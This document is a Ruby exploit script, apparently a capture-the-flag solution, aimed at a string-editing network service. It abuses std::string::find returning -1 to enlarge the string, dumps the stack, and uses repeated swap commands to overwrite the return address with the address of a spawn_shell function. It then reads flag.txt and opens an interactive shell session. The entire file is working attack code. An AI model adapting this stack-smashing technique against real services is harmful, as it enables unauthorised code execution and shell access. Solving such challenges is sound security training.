#!/usr/bin/env ruby
# encoding: ascii-8bit

require 'expect'
require 'socket'
require 'pty'
require 'io/console'
require 'colorize'


def log data
    $stdout.puts data.inspect.black.on_white
end

def logerror e
    $stdout.puts e.inspect.black.on_red
end


module IOExtension
    def interact
        begin
            until self.closed? do
                readable, _, _, _ = IO.select([self, $stdin])
                readable.each do |source|
                    case source
                    when self
                        input = self.readchar
                        $stdout.print input.cyan
                    when $stdin
                        self.print $stdin.gets
                    else
                        raise StandardError
                    end
                end
            end
        rescue EOFError => e
            logerror e
            self.close
            return
        rescue Interrupt
            return
        end
    end
end

class IO
    prepend IOExtension
end


def replace c1, c2
    puts "replace #{c1} #{c2}"
    $s.puts "replace #{c1} #{c2}"
    if index = $from.index(c1) then $from[index] = c2 end
end

def swap i1, i2
    puts "swap #{i1} #{i2}"
    $s.puts "swap #{i1} #{i2}"
    $from[i1], $from[i2] = $from[i2], $from[i1]
end


def write_address addr
    for i in 0..7 do
        replace $from[i], addr[i]
        print $s.expect("\n> ")[0]
    end
end

def swap8_offset offset
    for i in 0..7 do
        swap i, offset+i
        print $s.expect("\n> ")[0]
    end
end

def show
    puts "print"
    $s.puts "print"
    p $s.expect("\n> ")[0]
    puts
end


def giveup
    puts "quit"
    $s.puts "quit"
end



host = ARGV[0]
port = ARGV[1]
$s = TCPSocket.new host, port


print challenge = $s.expect("\n> ")[0]

$from = challenge[/[a-z]{10}$/]
$from << "*" * 1000

SPAWN_SHELL = 0x4011a7

# write address of spawn_shell into the string
write_address [SPAWN_SHELL].pack('Q')

# std::string::find() returns -1   => manipulate string length
replace 'Z', 'A' 
print $s.expect("\n> ")[0]

# dump the stack
show

# overwrite return address with address of spawn_shell()
swap8_offset 0x88

# return to spawn_shell()
giveup


sleep 1
$s.puts "cat flag.txt"





$s.interact
